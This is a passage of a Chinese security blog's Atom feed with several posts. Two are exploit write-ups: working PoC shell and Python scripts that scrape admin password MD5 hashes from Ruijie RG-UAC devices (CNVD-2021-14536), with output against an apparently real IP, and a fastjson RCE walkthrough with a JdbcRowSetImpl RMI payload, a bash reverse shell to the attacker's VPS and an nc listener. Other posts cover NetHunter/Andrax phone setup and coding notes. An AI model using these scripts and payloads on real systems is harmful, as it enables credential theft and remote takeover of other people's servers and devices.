    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="CNVD-2021-14536"><a href="#CNVD-2021-14536" class="headerlink" title="CNVD-2021-14536"></a>CNVD-2021-14536</h2><p>锐捷RG-UAC统一上网行为管理审计系统存在信息泄漏，攻击者通过网页源代码可间接获取管理用户账户和密码的MD5值，解密后可登陆管理后台</p><p><a href="https://fofa.so/">Fofa</a>查询关键字 <code>title=&quot;RG-UAC登录页面&quot; &amp;&amp; body=&quot;admin&quot;</code></p><p><img src="../images/ruijie-1.jpg" alt="锐捷登陆页面"><br><code>Command+u</code>查看网页源码，<code>Command+f</code>搜索password即可看到密码的MD5</p><p>Burp数据包<br><img src="../images/ruijie-2.jpg" alt="锐捷响应包"></p><p>进行解密即可</p><pre><code class="zsh">❯ time ./Ruijie.sh https://61.191.151.185:4443/admin: &quot;password&quot;:&quot;0e563b8ae893f8f78f943fd72f1425b8&quot;guest: &quot;password&quot;:&quot;fcf41657f02f88137a1bcf068a32c0a3&quot;audit: &quot;password&quot;:&quot;d33542b8458db8cabd9843fe7c1e8784&quot;./Ruijie.sh https://61.191.151.185:4443/  0.02s user 0.01s system 5% cpu 0.507 total~ via 🐍 v2.7.16❯ time ./Ruijie_get_passwd.py https://61.191.151.185:4443/[o]Target:https://61.191.151.185:4443/super_amdin&#39;s password of MD5: 0e563b8ae893f8f78f943fd72f1425b8./Ruijie_get_passwd.py https://61.191.151.185:4443/  0.14s user 0.04s system 25% cpu 0.680 total</code></pre><h2 id="POC-1-shell脚本"><a href="#POC-1-shell脚本" class="headerlink" title="POC-1 shell脚本"></a>POC-1 shell脚本</h2><pre><code class="zsh"># !/bin/bash# File Name: Ruijie_get_password.sh## Author: Mr.Frame# Date: Mon Mar  8 16:10:52 CST 2021# Description:# CNVD-2021-14536 Ruijie 锐捷RG-UAC统一上网行为管理审计系统 # 核心语句: awk -F &quot;[,]&quot;  &#39;NR==148,/password/&#123;print &quot;admin: &quot;$5 &quot;\n&quot;  &quot;guest: &quot; $20 &quot;\n&quot; &quot;audit: &quot; $35 &#125;&#39;  aa.txtResp=$(mktemp)curl -k -sS &quot;$1&quot; &gt;&gt; $Respawk -F &quot;[,]&quot;  &#39;NR==148,/password/&#123;print &quot;admin: &quot;$5 &quot;\n&quot;  &quot;guest: &quot; $20 &quot;\n&quot; &quot;audit: &quot; $35 &#125;&#39;  $Resprm $Resp</code></pre><h2 id="POC-2-python脚本"><a href="#POC-2-python脚本" class="headerlink" title="POC-2 python脚本"></a>POC-2 python脚本</h2><pre><code class="python3">#!/usr/bin/env python3# -*- coding: utf-8 -*-# 2021-03-12# Author: Mr.Frame # Description:#      CNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞 #Usage:#      python3 ruijie_get_passwd  &lt;url&gt;import requestsimport urllib3import redef Ruijie_get_passwd(url):    &quot;Check CNVD-2021-14536 of Target&quot;    url=url    headers=&#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;    &#125;    urllib3.disable_warnings() # 关闭ssl警告    try:        response=requests.get(url=url,headers=headers,verify=False,timeout=2)    except Exception as e:        print(&quot;\033[31m[x]Connection failed\033[0m&quot;)        print(e.__str__())    if response.status_code == 200 and &quot;super_admin&quot; in response.text and &quot;password&quot; in response.text:            password=(re.search(&#39;[a-fA-F0-9]&#123;32&#125;&#39;, response.text)).group()            print(&quot;\033[32m[o]Target:&#123;&#125;\033[0m \nsuper_amdin&#39;s password of MD5: \033[31m&#123;&#125;\033[0m&quot;.format(url,password))    else:        print(&quot;\033[32mtarget:&#123;&#125; is safe\033[0m&quot;)if __name__ == &#39;__main__&#39;:    import sys    if sys.argv.__len__() != 2:        print(&quot;python3 ruijie_get_passwd  https://x.x.x.x:&lt;port&gt;&quot;)    else:        Ruijie_get_passwd(sys.argv[1])</code></pre><p>参考：<br><a href="https://mp.weixin.qq.com/s/4Lx3N1yOrFQbySzIuVjRcQ">CNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞 </a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;CNVD-2021-14536&quot;&gt;&lt;a href=&quot;#CNVD-2021-14536&quot; class=&quot;h</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>code_of_principle</title>
    <link href="https://askding.github.io/Coding/code-of-principle.html"/>
    <id>https://askding.github.io/Coding/code-of-principle.html</id>
    <published>2021-03-07T07:23:04.000Z</published>
    <updated>2021-03-07T07:23:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><a href="https://zh-google-styleguide.readthedocs.io/en/latest/contents/">谷歌代码规范</a></p><p>编程属于设计行为，负责制造的是编译器或者构建系统<br>程序员的能力是用来为用户创造价值的</p><h1 id="How-to-code"><a href="#How-to-code" class="headerlink" title="How to code"></a>How to code</h1><p>文学编程(代码即设计文档) 用于表述文档的语言和编程语言结合在了一起<br>高质量代码三大特性：可读性 &gt; 简洁性 &gt; 灵活性</p><ul><li><input disabled="" type="checkbox"> 可读性 第一要务</li><li><input disabled="" type="checkbox"> 简洁性 保持代码简洁，不写多余的代码，不写重复的代码</li><li><input disabled="" type="checkbox"> 灵活性 添加新代码时，与已有代码不冲突、不排斥<br>高质量代码是拥有多种扩展方法、不存在多余要素、可读性高、易于理解的代码。 </li></ul><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>“插件式”软件架构</p><ul><li>非功能需求<br>非功能对开发、运维、计算机资源的高校运用有较大影响，在发布后的运维阶段，比较大的问题多是由性能、系统宕机等非功能需求引起的。</li></ul><h2 id="再版-重构"><a href="#再版-重构" class="headerlink" title="再版-重构"></a>再版-重构</h2><blockquote><p>在不改变代码外部行为的前提下，对代码内部结构进行优化，亦称代码体质优化</p></blockquote><p>重构的征兆:</p><ul><li><input disabled="" type="checkbox"> 代码重复、命名不一致</li><li><input disabled="" type="checkbox"> 函数体太长</li><li><input disabled="" type="checkbox"> 模块规模太大、太多</li></ul><h2 id="图书-包"><a href="#图书-包" class="headerlink" title="图书-包"></a>图书-包</h2><p>包：一种方便组织代码的机制(实现封装和模块化开发)，类似于文件夹，还可以解决命令冲突问题。<br>等模块积攒到一定数量之后再自上而下的将模块按照某种有意义的单位整理并分割</p><h2 id="章节-模块"><a href="#章节-模块" class="headerlink" title="章节-模块"></a>章节-模块</h2><p>针对借口编程，而不是针对实现编程</p><p>模块化：让修改模块所带来的影响停留在改模块内部<br>模块间互相频繁调用表明折俩函数应放在一个模块</p><p>抽象： 舍弃多余的东西，抽取对象共同的性质组成通用的概念</p><p>Parnas原则：</p><ul><li>对于模块的使用者，仅提供使用该模块锁必需的所有信息，其余信息概不提供</li><li>对模块的开发者，仅提供实现该模块所必需的所有信息，其余信息概不提供</li></ul><p>关注点分离： 将各个与关注点有关的代码集中起来做成独立的模块，与其他代码分离。如MVC模型，AOP(面向切面编程)</p><p>OCP开闭原则: 对扩展开发、对修改关闭 面向对象的多态性是实现OCP的代表技术</p><ul><li>内聚度: 单个模块内的功能的纯粹程度</li><li>耦合度: 衡量模块间关系紧密程度 模块间仅通过参数传递标量类型的数据作为模块间的接口</li></ul><p>模块应以实现高内聚、低耦合的模块为目标</p><h2 id="序言-注释"><a href="#序言-注释" class="headerlink" title="序言-注释"></a>序言-注释</h2><p>注释的目的是帮值阅读代码的人了解作者写代码时的思想</p><p> 代码只能表达“What”、“How” 、注释表达“Why”<br> 注释内容要简洁明了，防止注释二义性</p><h3 id="模块注释"><a href="#模块注释" class="headerlink" title="模块注释"></a>模块注释</h3><pre><code class="zsh"># File Name: xxx# Author: Mr.Frame# Version: 0.1# Date: # Description: ### Function List:</code></pre><h3 id="函数注释"><a href="#函数注释" class="headerlink" title="函数注释"></a>函数注释</h3><pre><code class="zsh"># Function: # Description: ## Input: # Output:# Return: # Call: # Called by: # Others:</code></pre><h3 id="代码注释"><a href="#代码注释" class="headerlink" title="代码注释"></a>代码注释</h3><p>注释应放在代码上方/或/右方</p><h2 id="目录-函数"><a href="#目录-函数" class="headerlink" title="目录-函数"></a>目录-函数</h2><p>将代码分割成级别统一的函数，函数一览起到目录的作用</p><p>复合函数： 将函数结构化，各函数的处理将以调用比自己低一个级别的函数为中心<br>不要在复合函数中调用不同抽象级别的函数，<br>一个函数中不能既有连接数据库(低级处理)、又有执行业务逻辑(高级处理)</p><p>将关系紧密的代码集中在一起函数化，同时保证关联性较弱的代码互不依赖</p><p>通用过滤器：接收某种数据流后，经过加工输出文本格式的数据流</p><p>函数行数不过百，仅输出重要信息</p><p>防御性编程:</p><ul><li><input disabled="" type="checkbox"> 确认外部代码传来的数据输入值(有效范围、字符串长度)</li><li><input disabled="" type="checkbox"> 确认参数的值(检测无效输入)</li></ul><h2 id="段落-代码块"><a href="#段落-代码块" class="headerlink" title="段落-代码块"></a>段落-代码块</h2><p>正交性: 代码之间应具有独立性和分离性(例如：访问数据库代码和用户接口代码)</p><p>代码块内列对齐</p><p>不同的代码块之间有空行</p><blockquote><p>数据常量化<br>对代码的逻辑进行函数化、模块化</p></blockquote><p>比较操作时，把改变的值放在左边，把稳定的值放在右边</p><p>将逻辑和该逻辑处理的数据放在相近的位置</p><p>处理流程尽量走直线,不使用条件分支</p><p>每个控制条件都存在与之成对的反条件，<br>保证控制条件具有统一性：<br>即便某个if语句一定成立，也要考虑else语句的情况<br>即便某个case语句一定成立，也要考虑default语句的情况<br>即使某个变量不可能为空，也要检查该变量是否为NULL</p><h2 id="正文-代码"><a href="#正文-代码" class="headerlink" title="正文-代码"></a>正文-代码</h2><p>命名：名字是面向代码阅读者的用户界面。名字说明的是效果和目的，不是手段， </p><ul><li><p>使用专业具体含义的词</p></li><li><p>全局变量名较长，局部变量名较短</p></li><li><p>恰当使用大小写和下划线</p></li><li><p>减少变量作用域</p></li></ul><ul><li><input disabled="" type="checkbox"> 表示范围: max/min 、first/last 、begin/end</li><li><input disabled="" type="checkbox"> 表示bool: is/has</li></ul><h2 id="注释-索引-Editor自带"><a href="#注释-索引-Editor自带" class="headerlink" title="注释/索引-Editor自带"></a>注释/索引-Editor自带</h2><p>图书中有注释和索引，但IDE和编辑器的跳转和搜索功能可以满足这部分需求。</p><ul><li>「编程的原则：改善代码质量的101个方法」</li></ul><h1 id="How-to-read"><a href="#How-to-read" class="headerlink" title="How to read"></a>How to read</h1><p>代码阅读是一项机会主义、以目标为导向的思维活动。<br>在大多数情况下，我们无法承担阅读和理解整个软件系统代码的代价，<br>任何试图对代码进行精确分析的想法，都会导致陷入大量的类、文件和模块中。<br>因此，<strong>我们必须积极低减少必须理解的代码</strong></p><ul><li><input disabled="" type="checkbox"> 学习编写伟大代码的方式: 阅读大量优质代码<br>阅读优秀源码基础:</li><li><input disabled="" type="checkbox"> 设计模式</li><li><input disabled="" type="checkbox"> 算法、数据结构</li></ul><p>在熟悉基本的编程和计算机科学概念后，通过阅读一套设计良好的软件系统的内部细节<br>    可以学到新颖的架构模式、数据结构、编码方法、算法、风格和文档规范、API、甚至一门新的计算机语言。</p><ul><li><input disabled="" type="checkbox"> 良好习惯: 有目标地阅读辨认编写的高质量代码(遇到库元素就阅读库文档)</li></ul><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><ul><li><input disabled="" type="checkbox"> 阅读README，安装依赖，编译运行,编译不成功不读</li><li><input disabled="" type="checkbox"> 主框架,阅读main函数，梳理主逻辑<ul><li><input disabled="" type="checkbox"> a. 函数调用顺序、及其参数</li><li><input disabled="" type="checkbox"> b. </li></ul></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;https://zh-google-styleguide.readthedocs.io/en/l</summary>
      
    
    
    
    <category term="Coding" scheme="https://askding.github.io/categories/Coding/"/>
    
    
  </entry>
  
  <entry>
    <title>kali_nethunter and Andrax</title>
    <link href="https://askding.github.io/Kali/kali-nethunter_and_Andrax.html"/>
    <id>https://askding.github.io/Kali/kali-nethunter_and_Andrax.html</id>
    <published>2021-03-02T01:01:43.000Z</published>
    <updated>2021-03-02T01:01:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Kali-Nethunter"><a href="#Kali-Nethunter" class="headerlink" title="Kali Nethunter"></a>Kali Nethunter</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><p>安装android-plateform-tools <code>brew install android-platform-tools</code></p></li><li><p>三个zip包</p><ul><li>[TWRP for 10](<a href="https://dl.twrp.me/guacamole/%EF%BC%89">https://dl.twrp.me/guacamole/）</a></li><li><a href="https://github.com/topjohnwu/Magisk/releases/download/v21.4/Magisk-v21.4.zip">Magisk</a></li><li><a href="https://zackptg5.com/downloads/Disable_Dm-Verity_ForceEncrypt_11.02.2020.zip">Disable-Dm-Verity_ForceEncrypt</a><br>可选</li></ul></li><li><p><a href="https://www.huaweicentral.com/download-latest-google-play-store-application-apk/#google_vignette">谷歌框架</a></p><h2 id="刷入"><a href="#刷入" class="headerlink" title="刷入"></a>刷入</h2></li><li><p>设置-&gt;系统-&gt;开发者模式界面，开启<strong>OEM解锁</strong>、<strong>USB调试</strong>两个个选项</p></li><li><p>手机链接电脑运行如下命令</p><pre><code class="zsh">adb reboot bootloader                                       # 进入fastboot模式fastboot oem unlock                                         # 解锁，手机出现解锁界面，用音量键选择UNLOCK THE BOOTLOADER，电源键确认fastboot boot twrp-3.x.x.x.img                              # 刷入twrp镜像,等待几秒进入临时twrp模式adb push twrp-3.x.x.zip /sdcard                             # 上传twrp的zip包，并刷入twrp镜像,adb reboot recovery                                         # 重启到recovery模式adb push Magisk-vx.zip                                      # 上传Magisk包并刷入adb push Disable_Dm-Verify-ForceEncrypt_xx.zip /sdcard      # 解锁Data分区，上传Disable_Dm-Verity-ForceEncrypt并刷入adb reboot                                                  # 重启，进行初始化设置adb push nethunter-2021.1-oneplus7-oos-ten-kalifs-full.zip  # 上传kali nethunter镜像并刷入adb reboot                                                  # 重启</code></pre></li></ul><p><img src="../images/nethunter.jpg" alt="kali nethunter"></p><h2 id="关闭系统更新提示"><a href="#关闭系统更新提示" class="headerlink" title="关闭系统更新提示"></a>关闭系统更新提示</h2><pre><code class="zsh">adb shell pm disable-user com.oneplus.opbackup    # 屏蔽更新adb shell pm clear com.oneplus.opbackup           # 清除通知adb shell enable com.oneplus.opbackup             # 恢复更新</code></pre><h2 id="升级系统保留ROOT权限操作"><a href="#升级系统保留ROOT权限操作" class="headerlink" title="升级系统保留ROOT权限操作"></a>升级系统保留ROOT权限操作</h2><p><a href="https://cyhour.com/1233/">一加7T如何保留ROOT OTA升级系统</a><br><a href="https://koonchung.github.io/post/2020-05-07/">一加7 OTA升级保留ROOT</a></p><h1 id="Andrax"><a href="#Andrax" class="headerlink" title="Andrax"></a><a href="https://andrax.thecrackertechnology.com/">Andrax</a></h1><p><a href="https://andrax.thecrackertechnology.com/documentation/">Andrax文档</a></p><p><a href="https://gitlab.com/crk-mythical/andrax-hackers-platform-v5-2">Andrax仓库</a></p><p>下载<a href="https://download2347.mediafire.com/dj83upef4o5g/xvxo6hw9i99kdcn/ANDRAX-Mobile.zip">Andrax-mobile.zip</a><br>手机连接电脑输入</p><pre><code class="zsh">unzip ANDRAX-Mobile.zip adb push andraxcorev6001.tar.xz.cpt /sdcard/Downloadadb install ANDRAXMobile6001.apkadb shell pm list packages  # 查看所有包adb shell dumpsys activity  com.thecrackertechnology.andrax  # 获取指定包的Activityadb shell am start -n com.thecrackertechnology.andrax/com.thecrackertechnology.dragonterminal.ui.term.NeoTermActivity  # 点击”OK“</code></pre><p>root和andrax默认密码<code>andrax</code><br><img src="../images/andrax-1.jpg" alt="Andrax"></p><p><img src="../images/andrax-2.jpg" alt="Andrax"></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><pre><code class="zsh">sudo service --status-allsudo service ssh start</code></pre><h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><pre><code class="zsh">sudo service vnc startvnc-viewer 192.168.43.73:5901</code></pre><h2 id="Bluetooth-Hacking"><a href="#Bluetooth-Hacking" class="headerlink" title="Bluetooth Hacking"></a>Bluetooth Hacking</h2><ol><li><p>open Andrax Terminal with Recovery shell</p><pre><code class="zsh">sucd /;cat *.rc | grep -i &quot;bluetooth&quot; | grep -i &quot;net_bt_stack&quot; | grep -i &quot;\/dev&quot;  # 定位串口</code></pre><p>输出<br> chown bluetooth net_bt_stack <strong>/dev/ttyS0</strong></p></li><li><p>open Andrax Terminal</p><pre><code class="zsh">sudo stty -F /dev/ttyS0  # 查看串口速率sudo hciattach -s 115200 /dev/ttyS0 any 3000000   # 创建接口sudo hciconfig hci0 up  # 激活接口</code></pre></li></ol><p>参考<br><a href="https://www.zerozd.xyz/Android/67.html">一加7基于安卓10版本安装NetHunter</a><br><a href="https://www.blackh4t.org/oneplus7pro-kali-nethunter/">一加7Pro把玩Nethunter</a><br><a href="https://www.oneplusbbs.com/thread-4446250-1.html">就砖</a><br><a href="https://www.oneplusbbs.com/forum.php?mod=viewthread&tid=4065238">TWRP备份与还原操作</a><br><a href="https://www.xiaoyuanjiu.com/9093.html">TWRP备份与还原操作2</a></p><p><a href="https://www.anquanke.com/post/id/223493">Andrax和nethunter介绍</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Kali-Nethunter&quot;&gt;&lt;a href=&quot;#Kali-Nethunter&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    
  </entry>
  
  <entry>
    <title>python-basic</title>
    <link href="https://askding.github.io/Coding/python-basic.html"/>
    <id>https://askding.github.io/Coding/python-basic.html</id>
    <published>2021-01-30T03:48:44.000Z</published>
    <updated>2021-01-30T03:48:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p> 基础语法及关键字</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>类型是编译器用来分配存储空间的模板，</p><h3 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h3><p>变量是编译器分配给的内存地址(0x0000~0xffff)的别名</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>and/or短路逻辑: 表达式从左至右运算</li><li><input disabled="" type="checkbox"> ( A or B and C or D)，仅当A(or的左侧逻辑值)为True，则短路其后所有表达式</li><li><input disabled="" type="checkbox"> ( A and B and C or D), 仅当A(and左侧逻辑值)为False，则短路其后所有表达式</li></ul><h2 id="流程控制及异常处理"><a href="#流程控制及异常处理" class="headerlink" title="流程控制及异常处理"></a>流程控制及异常处理</h2><h3 id="顺序语句"><a href="#顺序语句" class="headerlink" title="顺序语句"></a>顺序语句</h3><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><h4 id="if型"><a href="#if型" class="headerlink" title="if型"></a>if型</h4><h4 id="case型"><a href="#case型" class="headerlink" title="case型"></a>case型</h4><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><h4 id="for型"><a href="#for型" class="headerlink" title="for型"></a>for型</h4><h4 id="while型"><a href="#while型" class="headerlink" title="while型"></a>while型</h4><h4 id="until型"><a href="#until型" class="headerlink" title="until型"></a>until型</h4><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><h1 id="进阶知识"><a href="#进阶知识" class="headerlink" title="进阶知识"></a>进阶知识</h1><h2 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h2><h2 id="编程思想"><a href="#编程思想" class="headerlink" title="编程思想"></a>编程思想</h2><h2 id="开源类库"><a href="#开源类库" class="headerlink" title="开源类库"></a>开源类库</h2><h2 id="开源框架"><a href="#开源框架" class="headerlink" title="开源框架"></a>开源框架</h2><h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识</summary>
      
    
    
    
    <category term="Coding" scheme="https://askding.github.io/categories/Coding/"/>
    
    
  </entry>
  
  <entry>
    <title>fastjson_rce</title>
    <link href="https://askding.github.io/Kali/Exploit/fastjson-rce.html"/>
    <id>https://askding.github.io/Kali/Exploit/fastjson-rce.html</id>
    <published>2021-01-29T08:09:51.000Z</published>
    <updated>2021-01-29T08:09:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="漏洞url"><a href="#漏洞url" class="headerlink" title="漏洞url"></a>漏洞url</h1><p><a href="http://x.x.x.x/demo/login">http://x.x.x.x/demo/login</a> </p><pre><code class="shell">POST /demo/login HTTP/1.1Host: x.x.x.xContent-Length: 35Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Content-Type: application/jsonOrigin: http://106.14.21.5:31180Referer: http://106.14.21.5:31180/demo/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510Connection: close&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;</code></pre><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="在vps-47-106-65-x-上生成payload"><a href="#在vps-47-106-65-x-上生成payload" class="headerlink" title="在vps(47.106.65.x)上生成payload"></a>在vps(47.106.65.x)上生成payload</h2><p><a href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson_tool.jar</a></p><pre><code class="shell">java -cp /tmp/fastjson_tool.jar fastjson.HRMIServer 47.106.65.x 1099 &quot;bash=bash -i &gt;&amp; /dev/tcp/47.106.65.x/9999 0&gt;&amp;1&quot;[-] payload:  &#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;[-] payload:  &#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;[-] Opening JRMP listener on 1099...</code></pre><h2 id="在vps上监听999端口"><a href="#在vps上监听999端口" class="headerlink" title="在vps上监听999端口"></a>在vps上监听999端口</h2><pre><code class="shell">nc -lvvp 999</code></pre><h2 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h2><pre><code class="shell">POST /demo/login HTTP/1.1Host: x.x.x.xContent-Length: 184Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Content-Type: application/jsonOrigin: http://x.x.x.xReferer: http://x.x.x.x/demo/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510Connection: close&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.106.65.x:1099/Object&quot;,&quot;autoCommit&quot;:true&#125;&#125;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;漏洞url&quot;&gt;&lt;a href=&quot;#漏洞url&quot; class=&quot;headerlink&quot; title=&quot;漏洞</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
</feed>
